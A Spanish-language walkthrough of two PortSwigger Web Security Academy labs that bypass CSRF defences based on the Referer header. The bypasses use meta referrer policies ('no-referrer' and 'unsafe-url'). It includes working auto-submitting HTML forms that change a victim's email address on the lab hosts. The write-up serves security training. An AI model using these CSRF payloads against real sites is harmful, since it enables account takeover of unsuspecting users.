![[Pasted image 20250911222414.png]]

![[Pasted image 20250911222430.png]]
Vemos que no funciona; esto me da a entender que está verificando la cabecera Referer.

Si capturamos la petición del exploit, veremos lo siguiente:
![[Pasted image 20250911222617.png]]

Como podemos observar, el Referer sí está cambiando, ya que se está ejecutando con uno diferente, lo que está causando el conflicto.

Ahora que tenemos la solicitud, si borramos la cabecera, ¿esto se sigue validando?:
![[Pasted image 20250911222751.png]]
Pues no, si la eliminamos, nos permite el cambio sin ningún problema.

Entonces, nuestro objetivo es quitar la cabecera Referer, pero desde el exploit. Esto lo vamos a intentar de la siguiente manera con ayuda de etiquetas `meta`:
```html
<html>

<head>
  <meta name="referrer" content="no-referrer">
</head>

<form class="login-form" name="change-email-form"
  action="https://0ada0062036c757c81c6b13100940028.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="prueba@prueta.com">
</form>

<script>
  document.forms[0].submit();
</script>

</html>
```
No todas, pero algunas cabeceras son manipulables desde el HTML, como la de `Referrer`. Recordemos que esta cabecera, por definición en HTML, es `Referrer` y ortográficamente también es así, pero por un error ortográfico en las cabeceras, cuando se tramita, lo hace como `Referer`.

> [!tip] Política `no-referrer`
> La política `no-referrer` en la etiqueta `<meta name="referrer" content="no-referrer">` indica al navegador que no envíe la cabecera `Referer` en ninguna solicitud saliente. Esto puede ser útil para eludir validaciones de `Referer` que esperan un valor específico o la ausencia de la cabecera para permitir la acción.

Bueno, ahora vemos si podemos completar el lab con esto:

![[Pasted image 20250911223657.png]]
![[Pasted image 20250911223643.png]]
Lab Terminado.

### Lab: CSRF with broken Referer validation

En este último laboratorio, el objetivo es el mismo: cambiar el correo electrónico, donde seguimos haciendo uso del concepto del Referer.

Vamos a capturar, como de costumbre, la petición para el cambio de email a ver qué nos encontramos:
![[Pasted image 20250911224205.png]]

No vemos que se emplee algún token, por lo que de inmediato creamos el envío del formulario automático a ver qué logramos:
```html
<form class="login-form" name="change-email-form"
  action="https://0a58003b04842cc682bd113f003700d9.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="Hacked@hack.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

![[Pasted image 20250911224606.png]]

Lo probamos y vemos lo siguiente:
![[Pasted image 20250911224629.png]]

Podemos intentar lo mismo que en el anterior, eliminando el campo `Referrer`, pero no va a funcionar en esta ocasión.

Capturemos la solicitud y vamos a intentar algunas cosas:
![[Pasted image 20250911224859.png]]
Como ya se intentó, si eliminamos el Referer, no vamos a lograr pasar, por lo que en este punto lo que podemos intentar es ver cómo se está validando esa cabecera.

Podemos intentar primero eliminando caracteres:
![[Pasted image 20250911225103.png]]
Vemos que no. Ahora intentamos agregar información:
![[Pasted image 20250911225136.png]]
Excelente, al parecer nosotros podemos agregar información como deseemos, ya que, por ejemplo, solo busca que en la cadena exista el patrón con el que se compara, que es el dominio exacto.

Entonces, nosotros podemos agregar a esto lo que queramos. Podemos intentar cambiar el nombre del archivo por el dominio; esto, por lógica, debería funcionar, pero no lo hará debido a las políticas del `Referrer`. Para solucionarlo, vamos a usar la política `unsafe-url`, la cual permite que en el `Referer` se incruste toda la URL por completo, incluidos los parámetros y todo lo que esté después del dominio dado.

> [!warning] Política `unsafe-url`
> La política `unsafe-url` en la etiqueta `<meta name="referrer" content="unsafe-url">` indica al navegador que envíe la URL completa (incluyendo el *path* y la *query string*) como valor de la cabecera `Referer`. Esta política es considerada "insegura" porque puede filtrar información sensible en la URL a sitios de terceros. Sin embargo, en escenarios de bypass de CSRF con validación de `Referer` rota, puede ser explotada si la aplicación solo busca una subcadena del dominio en el `Referer` y no valida la URL completa.

Con eso en cuenta, nuestro script va a quedar de la siguiente manera:
```html
<html>

<head>
  <meta name="referrer" content="unsafe-url">
</head>

<form class="login-form" name="change-email-form"
  action="https://0a58003b04842cc682bd113f003700d9.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="Hacked@hack.com">
</form>

<script>
  document.forms[0].submit();
</script>

</html>
```
![[Pasted image 20250911230025.png]]

![[Pasted image 20250911230119.png]]
Lab Terminado.